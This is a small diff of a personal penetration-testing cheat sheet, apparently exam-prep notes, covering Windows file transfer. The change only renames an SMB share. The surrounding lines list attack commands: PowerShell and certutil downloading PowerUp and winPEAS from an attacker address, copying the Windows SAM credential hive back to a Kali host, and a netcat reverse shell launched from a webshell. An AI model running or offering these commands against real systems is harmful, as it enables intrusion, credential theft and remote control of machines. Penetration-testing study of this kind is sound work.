@@ -21,12 +21,12 @@
 2. `powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.49.55/PowerUp.ps1', 'PowerUp.ps1') -exec bypass`
 3. `certutil.exe -urlcache -f -split http://$IP:80/winpeas.exe ` from window
 ### File Transfer via SMB
-0. `impacket-smbserver.py shareName sharePath` is the format. For shareName lets say smb and have sharePath and share.
+0. `impacket-smbserver.py shareName sharePath` is the format. For shareName lets say SMB and have sharePath and share.
 1. `mkdir share` and move files to transfer
-2. `impacket-smbserver smb share/ ` from linux
-3. `net use \\myIP\smb` from window
-4. `copy \\myIP\smb\winpeas.exe   \windows\temp\winpeas.exe` 
-5. `copy c:\Windows\Repair\SAM \\MYIP\tools\` copy content to my kali
+2. `impacket-smbserver SMB share/ ` from linux
+3. `net use \\myIP\SMB` from window
+4. `copy \\myIP\SMB\winpeas.exe   \windows\temp\winpeas.exe` 
+5. `copy c:\Windows\Repair\SAM \\MYIP\SMB` copy content to my kali
 6. in a webshell windows, `\\192.168.119.159\share\nc.exe -e cmd.exe 192.168.119.159 123`
 
  # Privilege Escalation for Window
